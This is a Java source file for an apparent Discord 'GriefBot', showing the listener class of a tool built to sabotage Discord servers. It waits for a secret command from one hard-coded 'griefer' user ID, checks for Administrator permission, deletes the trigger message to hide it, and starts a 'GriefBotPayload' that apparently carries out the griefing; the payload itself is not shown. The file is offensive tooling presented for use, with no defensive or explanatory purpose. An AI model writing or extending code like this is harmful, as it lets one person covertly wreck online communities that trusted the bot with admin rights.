package de.corruptedbytes;

import de.corruptedbytes.utils.Utils;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class GriefBotListener extends ListenerAdapter {

	@Override
	public void onReady(ReadyEvent e) {
		Utils.sendInfo();
	}

	@Override
	public void onMessageReceived(MessageReceivedEvent e) {
		if (e.isFromType(ChannelType.TEXT)) {
			Message message = e.getMessage();
			Guild guild = e.getGuild();
			User user = e.getMessage().getAuthor();

			if (message.getContentDisplay().equalsIgnoreCase(GriefBot.getInstance().getGriefCommand())
					&& user.getId().startsWith(GriefBot.getInstance().getGrieferUserID())) {
				try {
					if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
						try {
							message.delete().queue();
						} catch (Exception ignored) {
						}

						GriefBotPayload griefBotPayload = new GriefBotPayload(guild, user);
						griefBotPayload.startGrief();

					} else {
						message.getChannel().sendMessage(":x: The Bot works only with **Administrator** Permission!")
								.queue();
					}
				} catch (Exception ex) {
					System.err.println("Error: " + ex.getMessage());
				}
			}
		}
	}
}